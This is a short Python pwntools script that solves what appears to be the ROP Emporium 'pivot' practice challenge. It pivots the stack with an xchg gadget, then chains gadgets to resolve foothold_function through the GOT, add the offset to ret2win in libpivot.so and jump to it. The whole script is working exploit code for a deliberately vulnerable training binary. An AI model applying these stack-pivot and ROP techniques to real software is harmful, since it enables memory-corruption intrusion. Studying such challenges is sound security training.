from pwn import *
import time
elf = ELF("pivot")
lib_elf = ELF("libpivot.so")

io = elf.process()
io.recvuntil("pivot: 0x")
pivot_address = int(io.recvline()[:-1], 16)

read_memory_gadget = 0x4009c0 #mov (%rax), rax; ret, replace rax with the content of the memory in rax
set_rax_gadget = 0x4009bb #pop %rax; ret
pivot_to_rax_gdaget = 0x4009bd #xchg %rax, %rsp; ret
jmpRaxGadget = 0x4007c1 #jmp %rax
addToRaxGadget = 0x4009c4 #add rax, rbp; ret
setRbpGadget = 0x4007c8 #pop rbp; ret
#plan: call foothold function then get it's address, add to rax and jmp to it.
first_chain = b""
first_chain += p64(elf.plt["foothold_function"])
first_chain += p64(set_rax_gadget)
first_chain += p64(elf.got["foothold_function"])
first_chain += p64(read_memory_gadget)
first_chain += p64(setRbpGadget)
first_chain += p64(lib_elf.symbols["ret2win"] - lib_elf.symbols["foothold_function"])
first_chain += p64(addToRaxGadget)
first_chain += p64(jmpRaxGadget)
io.sendline(first_chain)
pivot_chain = b""
pivot_chain += b"a" * 40
pivot_chain += p64(set_rax_gadget)
pivot_chain += p64(pivot_address)
pivot_chain += p64(pivot_to_rax_gdaget)
io.sendline(pivot_chain)
io.interactive()
